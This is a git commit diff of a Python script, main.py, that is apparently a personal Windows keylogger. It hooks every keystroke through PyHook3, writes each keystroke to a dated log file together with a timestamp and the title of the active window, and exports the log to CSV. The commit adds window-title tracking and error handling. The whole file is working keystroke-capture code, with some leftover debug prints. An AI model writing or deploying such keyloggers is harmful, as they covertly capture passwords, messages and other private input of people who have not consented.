d04b1ecae87478e32176406304c318a8740d7db2
mantie <mantiereid2@gmail.com>
2019-08-16 23:08:14 -0400

    Added Window name to it. It will start a new line if the window name changes.  Added Exception handle for convert to table function.

--- main.py
+++ main.py
@@ -1,3 +1,6 @@
+#Created by Mantie N Reid II
+import os
+
 import PyHook3
 import pythoncom
 import  PySimpleGUI as sg
@@ -5,52 +8,86 @@ from datetime import datetime
 import  json
 import csv
 import  pandas as pd
+import win32gui
+import mmap
 
-datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
-datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and time the keys were pressed
 
 
 def ConvertToTable():
   datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
-  f=open(datelogname + 'logfile.txt','rb')
-  df = pd.read_csv(f, sep='|', names=["TimeStamp", "KeyStrokes"] )
-  df.to_csv('out.csv', index=None,)
+  try:
+    f=open(datelogname + '-logfile.txt','rb')
+  except FileNotFoundError:
+    print("the file was not found. But keep going, it will be converted after  the text file created")
+    return
 
 
-ConvertToTable()
+  df = pd.read_csv(f, sep='|',encoding= "ISO-8859-1", names=["TimeStamp", "Current Window", "KeyStrokes"] )
+  df.to_csv(datelogname +'-LogFileTable.csv', index=None,)
+
+
+
+def GiveNewLine():  # this will open the file and make the first line start with the timestamp next to it.  Ensures it starts with a datetimestamp on the first line at start.
+  global apples
+  apples = "23"
+  datelogname = datetime.today().strftime('%m-%d-%Y')
+
+  datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')
+  w = win32gui
+  currentwindow = w.GetWindowText (w.GetForegroundWindow())
+
+  #print(w.GetWindowText (w.GetForegroundWindow()))
+  logfile = open(datelogname + "-logfile.txt", 'a+')
+
+
+  #print(windowname)
+  logfile.write("\n" + datetimestamp + "|" + currentwindow + "|" + " ")  # Adds a new line. Enters the current date, time, and current window
+  logfile.close()
+
 
 # Define a new function for the keylogger
 
 # sg.Popup('Hello from pysimple!', ' This is the shortest GUI program ever!')
 
-def GiveSpaceAtTheEnd():      # this will open the file and make the first line start with the timestamp next to it.  Ensures it starts with a datetimestamp on the first line at start.
-    datelogname = datetime.today().strftime('%m-%d-%Y')     # to be used for naming the log with the date in it.
-    datetimestamp = datetime.today().strftime(
-    '%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and time the keys were pressed
-    logfile = open(datelogname + "logfile.txt", 'a+')
-    logfile.write("\n" + datetimestamp + "|" ) # Adds a new line. Enters the current date and time next to it. Plus, it add's the Delimiter.
-    logfile.close() # closes the log file
+# def somefunction(event):
+ # currentwindow = windowname
+  # return True
 
 
-GiveSpaceAtTheEnd() # runs the fucntion
+
+
 def OnKeyboardEvent(event):
+    global windowname
+
+    w = win32gui
+    currentwindow = w.GetWindowText(w.GetForegroundWindow())
+
     datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
     datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and time the keys were pressed
-    logfile = open( datelogname + 'logfile.txt', 'a+')   # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
-    buffers = logfile.read()      # buffers is set to open the file and read what is  in it.
-    logfile.close()             # closes the log file.
+    logfile = open( datelogname + '-logfile.txt', 'a+')   # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
+    buffers = logfile.read()
+
+    logfile.close()
+
 
     # open the file to write the current new keystrokes.
 
-    logfile = open(datelogname + "logfile.txt", 'a+')  # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
-    #windowname = event.WindowName  # prints out the name of the current window being typed in.
-    keylogs = chr(event.Ascii)  # keylogs is whatever is being typed.
+    logfile = open(datelogname + "-logfile.txt", 'a+')
 
-    # print("Ascii value is: ", str(event.Ascii))
-    # print("current window being typed in " + windowname)
+    apples = 2
+    windowname = event.WindowName
+    keylogs = chr(event.Ascii)
 
-    if event.Ascii == 13:  # if entered is pressed, then start a new line and add the current date and time next to it. Plus, add the Delimiter.
-        keylogs = '\n' + datetimestamp + "|"  + " "
+    windownameholder = windowname
+
+
+    #print("window name is " + windowname)
+    #print("windowname holder is " +  windownameholder)
+
+
+
+    if event.Ascii == 13 :  # if entered is pressed, then start a new line, add datetimestamp, windowname and delimter
+        keylogs = '\n' + datetimestamp + "|" + currentwindow + "|" + " "
 
     if event.Ascii == 8:  # if backspace is used, then convert it to the word, back space. This is done to prevent it from showing up as a box.
         keylogs =' <Backspace> '
@@ -58,7 +95,7 @@ def OnKeyboardEvent(event):
     if event.Ascii == 9:
         keylogs =' <Tab> '
 
-    logfilelist = []  # this will be used to transfer the content of the logfile to a cvs logfile.
+    windowid =  event.Window
 
 
 
@@ -70,22 +107,79 @@ def OnKeyboardEvent(event):
 
     logfile.close()   # closes the file
 
-    # logfile = open(datelogname + 'logfile.txt', 'r')
-    # logfilelist = [line.split('||') for line in logfile.read()]
-    ConvertToTable()
+    def testfunction():
+      w = win32gui
+      currentwindow = w.GetWindowText(w.GetForegroundWindow())
 
+      datelogname = datetime.today().strftime('%m-%d-%Y')
+      datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')
+      with open(datelogname + "-logfile.txt", 'r') as fh:
+
+        data = fh.readlines()
+
+        lastline = data[-1]
+
+        print(repr(lastline))
+
+        windowid2 = event.Window
+        print(windowid)
+        print(windowid2)
+        fh.close()
+
+      #print('test')
+      #print(str(windowname) in str(lastline))
+      #print("The window has changed")
+      #logfile2 = open(datelogname + "-logfile.txt", 'a+')
+      #logfile2.write("\n" + datetimestamp + "|" + currentwindow + "|" + " ")
+      #logfile2.close()
+      print(str(lastline).find(currentwindow))
+      if str(lastline).find(str(windowname)) != -1:
+        print(str(lastline).find(str(windowname)))
+        print("The window name  has not changed")
+
+      else:
+
+        logfile2 = open(datelogname + "-logfile.txt", 'a+')
+        logfile2.write("\n" + datetimestamp + "|" + currentwindow + "|" + " ")
+        logfile2.close()
+        print(str(lastline).find(str(windowname)))
+        print("the window has  changed")
+
+
+
+    testfunction()
     return True
 
 
 
-hm = PyHook3.HookManager()
-hm.KeyDown = OnKeyboardEvent   # watch for all keyboard events
-hm.HookKeyboard()
-ConvertToTable()
 
 
 
-pythoncom.PumpMessages()
+
+
+  # watch for all keyboard events
+
+
+
+
+
+def main():
+  hm = PyHook3.HookManager()
+  hm.KeyDown = OnKeyboardEvent
+
+  hm.HookKeyboard()
+  ConvertToTable()
+
+  pythoncom.PumpMessages()
+
+  GiveNewLine()
+
+
+
+
+if __name__== "__main__":
+  main()
+
 
 
 
